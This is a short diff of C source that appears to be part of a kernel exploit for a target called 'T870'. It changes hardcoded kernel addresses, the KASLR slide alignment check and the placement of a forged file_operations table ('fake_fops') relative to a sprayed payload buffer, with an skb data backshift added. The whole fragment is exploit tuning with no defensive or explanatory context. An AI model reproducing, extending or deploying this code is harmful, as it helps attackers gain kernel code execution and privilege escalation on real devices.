@@ -17,6 +17,8 @@
 #define T870_STATIC_MISC_FOPS_DIRECT 0xffffffc00338d1e8ULL
 #define T870_STATIC_ANON_PIPE_BUF_OPS 0xffffff8009e21e00ULL
 #define T870_MAX_SLIDE 0x001f0000ULL
+#define T870_P0_ALIGNMENT 0x1000ULL
+#define T870_SKB_DATA_BACKSHIFT 0x0e80ULL
 #define T870_FOPS_TABLE_OFF 0x2000ULL
 #define T870_ORDER3_SIZE 0x8000ULL
 
@@ -36,7 +38,8 @@ static int aligned_slide(uint64_t value, uint64_t base)
     if (value < base)
         return 0;
     slide = value - base;
-    return slide <= T870_MAX_SLIDE && (slide & 0xffffU) == 0U;
+    return slide <= T870_MAX_SLIDE &&
+        (slide & (T870_P0_ALIGNMENT - 1U)) == 0U;
 }
 
 static int validate_inputs(const struct t870_bridge_inputs *inputs)
@@ -48,7 +51,8 @@ static int validate_inputs(const struct t870_bridge_inputs *inputs)
         inputs->payload_base + T870_ORDER3_SIZE > T870_DIRECT_MAP_END ||
         (inputs->payload_base & (T870_ORDER3_SIZE - 1U)) != 0U)
         return 0;
-    if (inputs->fake_fops != inputs->payload_base + T870_FOPS_TABLE_OFF)
+    if (inputs->fake_fops != inputs->payload_base -
+        T870_SKB_DATA_BACKSHIFT + T870_FOPS_TABLE_OFF)
         return 0;
     if (!aligned_slide(inputs->misc_fops_direct,
                        T870_STATIC_MISC_FOPS_DIRECT) ||
